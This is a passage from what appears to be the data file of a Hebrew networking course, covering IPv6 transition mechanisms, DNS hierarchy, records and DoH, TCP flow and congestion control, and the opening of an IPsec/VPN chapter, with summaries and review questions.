          <p>העולם לא עבר לIPv6 ביום אחד. קיימים מנגנוני מעבר:</p>
          <p><strong>Dual-Stack</strong> (מועדף) – מחשב/נתב מריץ IPv4 ו-IPv6 במקביל. משתמש ב-IPv6 כשזמין, נופל ל-IPv4. כך עובדות רוב הרשתות היום.</p>
          <p><strong>Tunneling</strong> – IPv6 בתוך IPv4:</p>
          <ul>
            <li><strong>6in4</strong> – כמוס IPv6 ב-IPv4 Protocol 41. דורש tunnel broker</li>
            <li><strong>Teredo</strong> – IPv6 מעל UDP. עובד דרך NAT. בשימוש ב-Windows</li>
          </ul>
          <p><strong>NAT64 + DNS64</strong> – מאפשר מחשבים IPv6-only לתקשר עם שרתים IPv4-only:</p>
          <ul>
            <li>DNS64 יוצר AAAA record סינתטי מה-A record: <code>64:ff9b::93.184.216.34</code></li>
            <li>NAT64 gateway מתרגם חבילות IPv6 ↔ IPv4 בפועל</li>
          </ul>
          <p>נפוץ ברשתות סלולריות: iPhone-ים בT-Mobile נחשפים לIPv6-only עם NAT64 לגישה לאתרים ישנים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – IPv6",
        intro: "<p>השלכות מרחיקות לכת של 2^128 כתובות:</p>",
        blocks: [
          {
            title: "אם לכל מכשיר יש IP ציבורי – מה עם אבטחה?",
            icon: "🛡️",
            content: `<p>ב-IPv4, NAT סיפק הגנה בחינם – מחשב ברשת פרטית לא ניתן לגישה מחוץ. ב-IPv6, כל מכשיר יכול לקבל IP ציבורי ולהיות נגיש ישירות. <strong>Firewall חיוני יותר ב-IPv6 מאי פעם.</strong> IPv6 Firewall מגן – אבל אבד ה-"סתמי" של NAT. מנגד: NAT גרם לבעיות (P2P, VoIP, Gaming) – ב-IPv6 חיבורים ישירים חוזרים.</p>`
          },
          {
            title: "IoT ו-IPv6 – כמה מכשירים?",
            icon: "🌐",
            content: `<p>ב-2030 צפויים <strong>50 מיליארד</strong> מכשירי IoT. ב-IPv4, כולם ב-NAT = כאב ראש. ב-IPv6, כל חיישן בשדה, כל נורה חכמה, כל רכב אוטונומי יקבל IP ייחודי גלובלי. ניהול, עדכון, איתור תקלות – הופכים ישירים. IPv6 הוא התשתית שמאפשרת את עתיד ה-IoT.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 18",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>IPv6 = 128 ביטים, 2<sup>128</sup> כתובות. כתיבה: 8 קבוצות hex מופרדות ב-:</li>
              <li>קיצורים: השמטת אפסים מובילים, :: לקבוצות אפסים רצופות</li>
              <li>סוגים: Global Unicast, Link-Local (fe80::), Unique Local, Multicast (ff00::). אין Broadcast!</li>
              <li>Header קבוע 40B. אין checksum. אין fragmentation בנתבים. Flow Label</li>
              <li>NDP מחליף ARP (Multicast, לא Broadcast). SLAAC – IP אוטומטי ללא DHCP</li>
              <li>Dual-Stack = IPv4+IPv6 במקביל. NAT64+DNS64 = IPv6-only ↔ IPv4</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 18",
        questions: [
          {
            q: "מה ייצוג קצר של 2001:0db8:0000:0000:0000:0000:1234:5678?",
            a: "2001:db8::1234:5678. כללים: מוחקים אפסים מובילים (0db8→db8, 1234 נשאר). קבוצות האפסים הרצופות (:0000:0000:0000:0000:) מוחלפות פעם אחת ב-::."
          },
          {
            q: "מה SLAAC ולמה הוא שימושי?",
            a: "SLAAC מאפשר למחשב לבנות כתובת IPv6 בעצמו מתוך prefix שהנתב מכריז + suffix מה-MAC. אין צורך ב-DHCP server. כל מכשיר שמתחבר לרשת מקבל כתובת אוטומטית. פשוט, מהיר, ומתאים ל-IoT."
          },
          {
            q: "למה IPv6 לא צריך NAT?",
            a: "NAT קיים ב-IPv4 כי נגמרו הכתובות – צריך לשתף IP אחד בין הרבה מכשירים. IPv6 יש מספיק כתובות לכל מכשיר ב-IP ציבורי ייחודי. אין צורך לתרגם כתובות. כל מכשיר מתקשר ישירות."
          }
        ]
      }
    ]
  },
  {
    id: 19,
    title: "DNS בעומק – היררכיה, Records, ו-DoH",
    pages: [
      {
        type: "explanation",
        title: "היררכיית DNS",
        content: `
          <p>ה-DNS הוא מסד נתונים <strong>מבוזר והיררכי</strong> – אין שרת אחד שיודע הכל. שלוש רמות:</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 160" class="content-diagram">
              <rect x="110" y="5" width="120" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="24" text-anchor="middle" font-size="11" fill="var(--text)">Root Nameservers (13)</text>
              <line x1="170" y1="35" x2="170" y2="55"/>
              <rect x="60" y="55" width="220" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="74" text-anchor="middle" font-size="11" fill="var(--text)">TLD Nameservers (.com, .net, .org)</text>
              <line x1="170" y1="85" x2="170" y2="105"/>
              <rect x="60" y="105" width="220" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="170" y="124" text-anchor="middle" font-size="11" fill="white">Authoritative Nameservers</text>
              <text x="170" y="145" text-anchor="middle" font-size="9" fill="var(--text-muted)">(ns1.example.com – רשומות אמיתיות)</text>
              <line x1="60" y1="35" x2="60" y2="55" stroke="var(--text-muted)" stroke-dasharray="3,3"/>
              <line x1="280" y1="35" x2="280" y2="55" stroke="var(--text-muted)" stroke-dasharray="3,3"/>
            </svg>
          </div>
          <p><strong>Root Nameservers</strong> – 13 כתובות לוגיות (A–M), מופעלות ע"י 12 ארגונים, כל אחת מגובה על ידי מאות שרתים פיזיים ב-Anycast. לא יודעים כתובות סופיות – רק לאיזה TLD לפנות.</p>
          <p><strong>TLD Nameservers</strong> – אחראיים על סיומת (.com מנוהל ע"י Verisign, .org ע"י PIR). יודעים מי ה-Authoritative לכל domain.</p>
          <p><strong>Authoritative Nameservers</strong> – המקור האמיתי. מחזיקים את הרשומות של הדומיין. תשובתם = סופית.</p>
        `
      },
      {
        type: "explanation",
        title: "Recursive Resolution – כיצד DNS עובד צעד-צעד",
        content: `
          <p>כשהדפדפן מחפש <code>www.example.com</code>:</p>
          <div class="demo-flow">
            <ol class="demo-steps">
              <li><strong>Cache מקומי</strong> – OS בודק תחילה ב-cache מקומי ו-<code>/etc/hosts</code>. אם יש – מחזיר מיד</li>
              <li><strong>Recursive Resolver</strong> – בדרך כלל שרת ה-DNS של הספק/ארגון (כגון <code>1.1.1.1</code> של Cloudflare, <code>8.8.8.8</code> של Google). גם הוא בודק cache</li>
              <li><strong>Root Query</strong> – Resolver שואל Root: "מי מטפל ב-.com?"</li>
              <li><strong>TLD Query</strong> – Root מחזיר כתובת TLD. Resolver שואל TLD: "מי מטפל ב-example.com?"</li>
              <li><strong>Authoritative Query</strong> – TLD מחזיר Authoritative. Resolver שואל: "מה ה-IP של www.example.com?"</li>
              <li><strong>תשובה + Cache</strong> – Authoritative מחזיר A record. Resolver שומר ב-cache לפי TTL ומעביר ללקוח</li>
            </ol>
          </div>
          <p>בדרך כלל שלבים 3–5 קורים ב-~50ms. עם cache – ~1ms.</p>
          <p><strong>כמה שרתים בפועל?</strong> שאלה ל-Root היא נדירה – כולם ב-cache. Resolver ממוצע רץ שאלת Root פחות מפעם ביום.</p>
        `
      },
      {
        type: "explanation",
        title: "סוגי Records – טבלה מלאה",
        content: `
          <table class="content-table">
            <tr><th>Record</th><th>תפקיד</th><th>דוגמה</th></tr>
            <tr><td><strong>A</strong></td><td>שם → IPv4</td><td>example.com → 93.184.216.34</td></tr>
            <tr><td><strong>AAAA</strong></td><td>שם → IPv6</td><td>example.com → 2606:2800:220::1</td></tr>
            <tr><td><strong>CNAME</strong></td><td>Alias (שם → שם)</td><td>www.example.com → example.com</td></tr>
            <tr><td><strong>MX</strong></td><td>שרת Mail + עדיפות</td><td>example.com MX 10 mail.example.com</td></tr>
            <tr><td><strong>TXT</strong></td><td>טקסט חופשי – SPF, DKIM, אימות</td><td>"v=spf1 include:_spf.google.com ~all"</td></tr>
            <tr><td><strong>NS</strong></td><td>Nameservers מוסמכים לזון</td><td>example.com NS ns1.cloudflare.com</td></tr>
            <tr><td><strong>PTR</strong></td><td>IP → שם (Reverse DNS)</td><td>34.216.184.93.in-addr.arpa → example.com</td></tr>
            <tr><td><strong>SOA</strong></td><td>Start of Authority – מטא-נתוני הזון</td><td>Serial, Refresh, Retry, Expire, Min-TTL</td></tr>
            <tr><td><strong>SRV</strong></td><td>שירות מסוים – host:port</td><td>_sip._tcp.example.com → 5060 sip.example.com</td></tr>
            <tr><td><strong>CAA</strong></td><td>איזה CA רשאי להנפיק אישור?</td><td>example.com CAA 0 issue "letsencrypt.org"</td></tr>
          </table>
          <p><strong>CNAME לא יכול לשמש על root domain</strong> (apex). למשל <code>example.com</code> לא יכול להיות CNAME – רק A. זו הסיבה שאתרים משתמשים ב-<code>www.example.com</code> כ-CNAME.</p>
          <p><strong>MX priority</strong>: מספר נמוך = עדיפות גבוהה. אם יש כמה MX, דואר ינסה את הנמוך תחילה. לשרת backup: MX 20.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: dig – שאילתות DNS מתקדמות",
        content: `
          <p><code>dig</code> הוא הכלי המקצועי לשאילתות DNS (נפוץ ב-Linux/Mac):</p>
          <div class="code-preview">
            <pre><code># שאילתת A record
$ dig www.google.com
;; ANSWER SECTION:
www.google.com.   300   IN   A   142.250.185.46

# שאילתת MX – מיל
$ dig google.com MX
google.com.   300   IN   MX   10 smtp.google.com.

# שאילתת TXT – SPF
$ dig google.com TXT
google.com.   300   IN   TXT "v=spf1 include:_spf.google.com ~all"

# Reverse DNS
$ dig -x 8.8.8.8
8.8.8.8.in-addr.arpa. IN PTR dns.google.

# שאילתה ישירות לשרת authoritative
$ dig @8.8.8.8 example.com A

# מסלול DNS מלא (trace)
$ dig +trace www.example.com</code></pre>
          </div>
          <p class="demo-note">📋 <code>dig +trace</code> מראה את כל שלבי ה-resolution – Root → TLD → Authoritative. שימושי לאיבחון בעיות DNS ולהבנת המסלול.</p>
        `
      },
      {
        type: "explanation",
        title: "DNS Caching ו-TTL",
        content: `
          <p>כל record DNS מכיל <strong>TTL</strong> (Time To Live) בשניות – כמה זמן ה-resolver שומר ב-cache:</p>
          <ul>
            <li><strong>TTL נמוך</strong> (300s = 5 דקות): שינויים מתפשטים מהר. אבל הרבה שאילתות → עומס על ה-Authoritative</li>
            <li><strong>TTL גבוה</strong> (86400s = 24 שעות): ביצועים טובים, מעט שאילתות. אבל שינויים לוקחים זמן להתפשט</li>
          </ul>
          <p><strong>Negative caching</strong> – גם "הדומיין לא קיים" (NXDOMAIN) נשמר ב-cache, לפי ה-SOA minimum TTL. מונע הצפה בשאילתות לדומיינים שגויים.</p>
          <p><strong>שכבות cache:</strong></p>
          <ol>
            <li>Cache של הדפדפן (Chrome: chrome://net-internals/#dns)</li>
            <li>Cache של מערכת ההפעלה</li>
            <li>Cache של ה-Recursive Resolver (ISP / 1.1.1.1)</li>
          </ol>
          <p>כלים לניקוי cache:</p>
          <div class="code-preview">
            <pre><code># Windows
ipconfig /flushdns

# Linux (systemd-resolved)
sudo systemd-resolve --flush-caches

# macOS
sudo dscacheutil -flushcache</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "DNS over HTTPS (DoH) ו-DNS over TLS (DoT)",
        content: `
          <p>DNS מסורתי = UDP פורט 53 = <strong>גלוי לכל</strong>. הספק שלך, ה-WiFi הציבורי, כולם רואים לאיזה אתרים את גולשת.</p>
          <p><strong>DNS over HTTPS (DoH)</strong> – שאילתות DNS מוצפנות בתוך HTTPS על פורט 443. לא ניתן להבדיל מגלישה רגילה.</p>
          <p><strong>DNS over TLS (DoT)</strong> – שאילתות DNS מוצפנות ב-TLS על פורט 853. מוצפן, אבל ניתן לזהות.</p>
          <table class="content-table">
            <tr><th></th><th>DoH</th><th>DoT</th><th>DNS רגיל</th></tr>
            <tr><td>פורט</td><td>443</td><td>853</td><td>53</td></tr>
            <tr><td>הצפנה</td><td>✅</td><td>✅</td><td>❌</td></tr>
            <tr><td>ניתן לחסום בפורט</td><td>קשה (443 = הכל)</td><td>קל (853)</td><td>קל (53)</td></tr>
            <tr><td>Firefox, Chrome</td><td>✅ מובנה</td><td>לא</td><td>ברירת מחדל</td></tr>
          </table>
          <p>Cloudflare (<code>1.1.1.1</code>), Google (<code>8.8.8.8</code>), Mozilla – כולם מספקים DoH.</p>
          <p><strong>מחלוקת:</strong> DoH ריכז שאילתות DNS בידי כמה ספקים גדולים. ארגונים מודאגים שDoH יעקוף את ה-Firewall הארגוני ויחשוף נתוני גלישה.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – DNS",
        intro: "<p>DNS כנקודת כשל ועוצמה:</p>",
        blocks: [
          {
            title: "DNS Hijacking – כשה-DNS עצמו מושחת",
            icon: "⚠️",
            content: `<p>ספקי אינטרנט חלקם "חוטפים" שאילתות DNS לדומיינים שלא קיימים – במקום NXDOMAIN מחזירים דף פרסומות. גרוע יותר: DNS Spoofing / Cache Poisoning – תוקף מזהם את ה-cache של resolver עם תשובות מזויפות, מפנה לאתר פישינג. <strong>DNSSEC</strong> (DNS Security Extensions) פותר זאת ע"י חתימות קריפטוגרפיות על כל record – הrecord אמיתי רק אם החתימה תקינה.</p>`
          },
          {
            title: "DNS כ-Choke Point של האינטרנט",
            icon: "🌐",
            content: `<p>ב-2016, DDoS ענק על Dyn (ספקית DNS גדולה) הפיל את Twitter, Netflix, GitHub, Reddit – לשעות. הסיבה: DNS הוא infrastructure קריטי שכולם תלויים בו. פתרון: multi-CDN + כמה ספקי DNS שונים. כיום Amazon Route53, Cloudflare, NS1 מציעים anycast עם מאות נקודות נוכחות כדי לעמוד ב-DDoS.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 19",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>היררכיה: Root (13 לוגיים) → TLD (.com) → Authoritative (הרשומות האמיתיות)</li>
              <li>Recursive Resolver עושה את כל העבודה עבור הלקוח. Cache על TTL</li>
              <li>Records: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (SPF/DKIM), NS, PTR (reverse), SOA, CAA</li>
              <li>TTL גבוה = מהיר, איטי להשתנות. TTL נמוך = גמיש, עמוס</li>
              <li>DoH (פורט 443) ו-DoT (פורט 853) – DNS מוצפן. הגנת פרטיות</li>
              <li>dig = כלי מקצועי. dig +trace = מסלול מלא. ipconfig /flushdns = ניקוי cache</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 19",
        questions: [
          {
            q: "מה ההבדל בין Recursive Resolver ל-Authoritative Nameserver?",
            a: "Recursive Resolver = שרת שפועל בשם הלקוח, מסיר queries לכל השרתים בהיררכיה עד שמגיע לתשובה. לרוב מנוהל ע\"י ISP או ספק (1.1.1.1). Authoritative = המקור האמיתי לדומיין ספציפי – מחזיר תשובה סופית ללא delegation נוסף."
          },
          {
            q: "למה צריך CNAME ולא רק A record?",
            a: "CNAME מאפשר לכמה שמות לכוון לאותו שרת בלי כפילות. אם ה-IP משתנה, מספיק לשנות A record אחד – כל ה-CNAMEs עוקבים אוטומטית. דוגמה: blog.example.com, shop.example.com שניהם CNAME ל-example.com."
          },
          {
            q: "מה TXT record ולמה הוא שימושי?",
            a: "TXT record מכיל טקסט חופשי. שימושים: SPF (מי רשאי לשלוח מייל מהדומיין), DKIM (חתימה על מיילים), DMARC (מדיניות אימות מייל), אימות בעלות על הדומיין (Google Search Console, SSL cert). מגן מפני זיוף מיילים (email spoofing)."
          }
        ]
      }
    ]
  },
  {
    id: 20,
    title: "TCP בעומק – Flow Control, Congestion, Sliding Window",
    pages: [
      {
        type: "explanation",
        title: "בעיות ש-TCP צריך לפתור",
        content: `
          <p>TCP מבטיח העברה אמינה – אבל יש שלוש בעיות נפרדות:</p>
          <ul>
            <li><strong>אובדן חבילות</strong> – פקטה לא הגיעה. צריך לשלוח שוב</li>
            <li><strong>Flow Control</strong> – שולח מהיר מציף מקבל איטי</li>
            <li><strong>Congestion Control</strong> – כולם שולחים → רשת עמוסה → כולם מאטים</li>
          </ul>
          <p>TCP פותר את שלושתן, כל אחת בנפרד. בואי נראה איך.</p>
        `
      },
      {
        type: "explanation",
        title: "Sliding Window – Flow Control",
        content: `
          <p><strong>Flow Control</strong> מונע ממחשב מהיר להציף מחשב איטי. הפתרון: <strong>Receive Window (rwnd)</strong>.</p>
          <p>בכל ACK, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום בbuffer – שלח עד כאן". השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="20" width="280" height="60" rx="4" fill="var(--bg-elevated)" stroke="var(--accent)"/>
              <rect x="10" y="20" width="100" height="60" rx="0" fill="var(--accent-green)" opacity="0.6"/>
              <rect x="110" y="20" width="80" height="60" rx="0" fill="var(--accent-gold)" opacity="0.6"/>
              <text x="60" y="55" text-anchor="middle" font-size="9" fill="var(--text)">נשלח ← ACK</text>
              <text x="150" y="48" text-anchor="middle" font-size="9" fill="var(--text)">נשלח</text>
              <text x="150" y="62" text-anchor="middle" font-size="9" fill="var(--text)">ממתין ACK</text>
              <text x="245" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">מחכה לשליחה</text>
              <path d="M 190 5 L 190 18" stroke="var(--accent-gold)" stroke-width="2"/>
              <path d="M 290 5 L 290 18" stroke="var(--accent)" stroke-width="2"/>
              <text x="240" y="12" text-anchor="middle" font-size="9" fill="var(--accent-gold)">← rwnd →</text>
            </svg>
            <p class="diagram-caption">Sliding Window – רק הנתונים בחלון צהוב בטיסה</p>
          </div>
          <p><strong>Window Scaling</strong> (RFC 1323): שדה rwnd = 16 ביטים = מקס 65535 בתים. לא מספיק לחיבורים מהירים. Window Scale = מכפיל של עד 2^14. עם Scale=10: window מקס ≈ 64MB. עם Scale=14 (מקסימום): window מקס ≈ 1GB!</p>
          <p>אם <code>rwnd=0</code> – השולח מפסיק לשלוח ושולח Zero Window Probe כל כמה שניות עד שהמקבל יפתח.</p>
        `
      },
      {
        type: "explanation",
        title: "Congestion Control – Slow Start",
        content: `
          <p><strong>Congestion Control</strong> מונע מכולם להציף את הרשת. השולח מנהל <strong>Congestion Window (cwnd)</strong>.</p>
          <p>הכלל: מספר הבתים בטיסה ≤ <strong>min(cwnd, rwnd)</strong>.</p>
          <p><strong>Slow Start</strong> – בפתיחת חיבור, cwnd מתחיל קטן ומתגדל מהיר:</p>
          <ul>
            <li>cwnd מתחיל ב-1–10 MSS (Maximum Segment Size ≈ 1460 בתים)</li>
            <li>כל ACK שמגיע → cwnd += 1 MSS</li>
            <li>כל RTT → cwnd מכפיל (גידול אקספוננציאלי)</li>
            <li>ממשיך עד שמגיע ל-<strong>ssthresh</strong> (Slow Start Threshold)</li>
          </ul>
          <div class="diagram-container">
            <svg viewBox="0 0 300 120" class="content-diagram">
              <line x1="30" y1="10" x2="30" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
              <line x1="30" y1="110" x2="290" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
              <text x="18" y="114" font-size="8" fill="var(--text-muted)">0</text>
              <text x="18" y="15" font-size="8" fill="var(--text-muted)">cwnd</text>
              <text x="290" y="116" font-size="8" fill="var(--text-muted)">RTT</text>
              <polyline points="30,108 60,100 90,85 120,60 150,42 180,38 210,34 240,30" fill="none" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="150" y1="10" x2="150" y2="110" stroke="var(--accent-gold)" stroke-width="1" stroke-dasharray="4,3"/>
              <text x="152" y="25" font-size="8" fill="var(--accent-gold)">ssthresh</text>
              <text x="50" y="72" font-size="8" fill="var(--accent-green)">Slow Start</text>
              <text x="165" y="50" font-size="8" fill="var(--text)">Cong. Avoid.</text>
            </svg>
            <p class="diagram-caption">Slow Start: גידול אקספוננציאלי → Congestion Avoidance: לינארי</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "Congestion Avoidance ו-AIMD",
        content: `
          <p>לאחר שמגיע ל-ssthresh, TCP עובר ל-<strong>Congestion Avoidance</strong>:</p>
          <ul>
            <li>גידול לינארי: כל RTT → cwnd += 1 MSS</li>
            <li>האלגוריתם: <strong>AIMD</strong> (Additive Increase, Multiplicative Decrease)</li>
          </ul>
          <p><strong>כשיש אובדן (Loss Detection):</strong></p>
          <p><strong>שיטה 1 – Timeout (RTO)</strong>: לא הגיע ACK בזמן:</p>
          <ul>
            <li>ssthresh = cwnd / 2</li>
            <li>cwnd = 1 MSS (חזרה לSlow Start מהתחלה!)</li>
            <li>RTO מוכפל (Exponential Backoff)</li>
          </ul>
          <p><strong>שיטה 2 – 3 Duplicate ACKs (Fast Retransmit)</strong>: 3 ACKs לאותו sequence = חבילה אחת אבדה:</p>
          <ul>
            <li>שולח מיד (לא מחכה ל-timeout)</li>
            <li>ssthresh = cwnd / 2; cwnd = ssthresh + 3 MSS</li>
            <li><strong>Fast Recovery</strong>: לא חוזרים ל-Slow Start – נשארים בCongestion Avoidance</li>
          </ul>
          <p>המוטיבציה: Timeout = ייתכן רשת עמוסה מאוד. Dup-ACKs = כנראה חבילה בודדת אבדה, הרשת עדיין עובדת.</p>
        `
      },
      {
        type: "explanation",
        title: "RTT ו-RTO – חישוב Timeout",
        content: `
          <p>כמה זמן לחכות לפני Timeout? TCP מחשב <strong>RTO</strong> (Retransmission Timeout) דינמית:</p>
          <p><strong>SRTT</strong> (Smoothed RTT) – ממוצע משוקלל:</p>
          <div class="code-preview">
            <pre><code>α = 0.125
SRTT = (1 - α) × SRTT + α × RTT_sample</code></pre>
          </div>
          <p><strong>RTTVAR</strong> – שונות RTT:</p>
          <div class="code-preview">
            <pre><code>β = 0.25
RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
          </div>
          <p><strong>RTO:</strong></p>
          <div class="code-preview">
            <pre><code>RTO = SRTT + 4 × RTTVAR  (מינימום 1 שניה)</code></pre>
          </div>
          <p><strong>Karn's Algorithm</strong>: לא מחשבים RTT sample מ-retransmission – אי אפשר לדעת אם ה-ACK שייך לשליחה הראשונה או השנייה. RTO מוכפל עם כל timeout עוקב (Exponential Backoff), מוגבל ל-60–120 שניות.</p>
        `
      },
      {
        type: "explanation",
        title: "אלגוריתמי Congestion מודרניים",
        content: `
          <table class="content-table">
            <tr><th>אלגוריתם</th><th>הגישה</th><th>שימוש</th></tr>
            <tr><td><strong>TCP Reno</strong></td><td>AIMD קלאסי, מגיב לאובדן</td><td>היסטורי, ברירת מחדל ישנה</td></tr>
            <tr><td><strong>TCP CUBIC</strong></td><td>פונקציה קוביקית של הזמן מאז האובדן האחרון. אגרסיבי יותר ב-high-BDP</td><td>Linux ברירת מחדל</td></tr>
            <tr><td><strong>BBR (Google)</strong></td><td>Bottleneck Bandwidth + RTT. מודד רוחב פס ולא מסתמך על אובדן כסימן</td><td>YouTube, Google Cloud. מצוין ב-WiFi ולוויין</td></tr>
            <tr><td><strong>QUIC/HTTP3</strong></td><td>UDP עם congestion control מובנה + TLS 1.3. מנגנון נפרד לכל stream</td><td>Google (60% תעבורה), HTTP/3</td></tr>
          </table>
          <p><strong>BDP</strong> (Bandwidth-Delay Product) = Bandwidth × RTT = מספר הבתים "בטיסה" ברשת. עבור 1Gbps × 100ms = 12.5MB בטיסה. ה-window חייב להיות לפחות גדול כ-BDP לניצול מלא.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – TCP",
        intro: "<p>למה TCP נשאר רלוונטי אחרי 40 שנה:</p>",
        blocks: [
          {
            title: "TCP על קישורי לווין – BDP בעיה",
            icon: "🛰️",
            content: `<p>לווין גיאוסטציונרי = RTT ≈ 600ms. BDP = 100Mbps × 0.6s = 7.5MB. שפורטוקול TCP ישן עם window 65KB ינצל רק 65KB/600ms = 0.87Mbps מתוך 100Mbps! <strong>BBR ו-Window Scaling</strong> פותרים זאת. Starlink (LEO orbit, RTT 20ms) עוקפת את הבעיה עם מסלול נמוך יותר. גלגולים: חיישת TCP ≠ חיישת פיזיקה.</p>`
          },
          {
            title: "Nagle's Algorithm – מיקרו-אופטימיזציה",
            icon: "⚡",
            content: `<p><strong>Nagle's Algorithm</strong>: TCP מחכה עד שיש מספיק נתונים לשלוח (מלא MSS) לפני שהוא שולח. מונע הצפת רשת ב"tiny packets" (למשל SSH שולח כל הקשת מקלדת בנפרד). <strong>בעיה</strong>: ב-Real-Time apps (games, trading) מוסיף latency. פתרון: <code>TCP_NODELAY</code> – כיבוי Nagle. כל גיימר ו-HFT trader מכירים את הflag הזה.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 20",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Flow Control: rwnd – המקבל מודיע כמה מקום יש. שולח לא שולח יותר</li>
              <li>Congestion Control: cwnd – שולח מנהל עצמו לפי עומס רשת</li>
              <li>Slow Start: גידול אקספוננציאלי. Congestion Avoidance (AIMD): לינארי</li>
              <li>Loss: Timeout → cwnd=1. 3 Dup-ACKs → Fast Retransmit + Fast Recovery (cwnd=ssthresh)</li>
              <li>RTO = SRTT + 4×RTTVAR. Karn's Algorithm. Exponential Backoff</li>
              <li>CUBIC (Linux), BBR (Google), QUIC/HTTP3 – אלגוריתמים מודרניים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 20",
        questions: [
          {
            q: "מה ההבדל בין Flow Control ל-Congestion Control?",
            a: "Flow Control מגן על המקבל – rwnd קובע כמה אפשר לשלוח לפי ה-buffer של המקבל. Congestion Control מגן על הרשת – cwnd קובע כמה אפשר לשלוח לפי עומס הרשת. אפקטיבי: min(cwnd, rwnd)."
          },
          {
            q: "למה Slow Start מתחיל איטי אבל מאיץ מהיר?",
            a: "Slow Start מתחיל ב-1 MSS כדי לא להציף רשת שמצב לא ידוע. אבל גידול אקספוננציאלי (מכפיל כל RTT) אומר שב-10 RTT כבר מגיע ל-1024 MSS ≈ 1.5MB. זה 'איטי' רק ביחס לפתיחה ב-מהירות מלאה, אבל בפועל מהיר מאוד."
          },
          {
            q: "מה Fast Retransmit ולמה הוא עדיף על Timeout?",
            a: "3 Duplicate ACKs = צד אחד קיבל חבילות אחרי החסרה, אז הוא שולח ACKs חוזרים לsq האחרון שקיבל. Fast Retransmit שולח מיד ולא מחכה ל-RTO (שיכול להיות שניות). Fast Recovery לא מחזיר ל-Slow Start – cwnd נשאר גבוה. הרשת עדיין עובדת, רק חבילה אחת אבדה."
          }
        ]
      }
    ]
  },
  {
    id: 21,
    title: "VPN ואבטחת רשת",
    pages: [
      {
        type: "explanation",
        title: "מה זה VPN?",
        content: `
          <p><strong>VPN</strong> (Virtual Private Network) – יוצר "מנהרה" מוצפנת בין שני נקודות דרך רשת ציבורית. כאילו החיבור הוא פרטי ישיר, גם אם עובר דרך האינטרנט.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="54" text-anchor="middle" font-size="10">עובד</text>
              <text x="45" y="66" text-anchor="middle" font-size="8" fill="var(--text-muted)">ביתי</text>
              <rect x="260" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="295" y="50" text-anchor="middle" font-size="10">רשת</text>
              <text x="295" y="62" text-anchor="middle" font-size="10">חברה</text>
              <path d="M 80 50 Q 170 20 260 50" stroke="var(--accent-green)" stroke-width="3" fill="none" stroke-dasharray="8,4"/>
              <rect x="130" y="15" width="80" height="25" rx="4" fill="#3a3a6a" stroke="var(--accent)"/>
              <text x="170" y="31" text-anchor="middle" font-size="9" fill="white">🔒 מנהרה VPN</text>
              <text x="80" y="80" font-size="8" fill="var(--text-muted)">אינטרנט ציבורי</text>
            </svg>
          </div>
          <p><strong>שני סוגים עיקריים:</strong></p>
          <ul>
            <li><strong>Remote Access VPN</strong> – עובד מהבית מתחבר לרשת החברה. Client-software על המחשב</li>
            <li><strong>Site-to-Site VPN</strong> – מחבר שני משרדים באופן קבוע. הנתבים מנהלים את המנהרה, לא המחשבים</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "IPsec – VPN ברמת Layer 3",
        content: `
          <p><strong>IPsec</strong> פועל בשכבת הרשת (Layer 3) ומספק: אימות, שלמות, הצפנה, ומניעת replay.</p>
          <p><strong>שני פרוטוקולים:</strong></p>
          <ul>
            <li><strong>AH</strong> (Authentication Header) – אימות ושלמות בלבד. ללא הצפנה. פרוטוקול 51</li>
            <li><strong>ESP</strong> (Encapsulating Security Payload) – הצפנה + אימות + שלמות. פרוטוקול 50. <strong>מה שמשתמשים בפועל</strong></li>
          </ul>
          <p><strong>שני מצבים:</strong></p>
          <table class="content-table">
            <tr><th>מצב</th><th>מה מוצפן</th><th>שימוש</th></tr>
            <tr><td>Transport</td><td>Payload בלבד, IP Header גלוי</td><td>Host-to-Host</td></tr>
            <tr><td>Tunnel</td><td>כל הפקטה המקורית עטופה בפקטה חדשה</td><td>VPN Gateways, Site-to-Site</td></tr>
          </table>
          <p><strong>IKE</strong> (Internet Key Exchange) – שלב חילופי המפתחות, UDP פורט 500:</p>
          <ul>
            <li><strong>IKEv1</strong> – שני שלבים (Phase 1 + Phase 2). ישן</li>
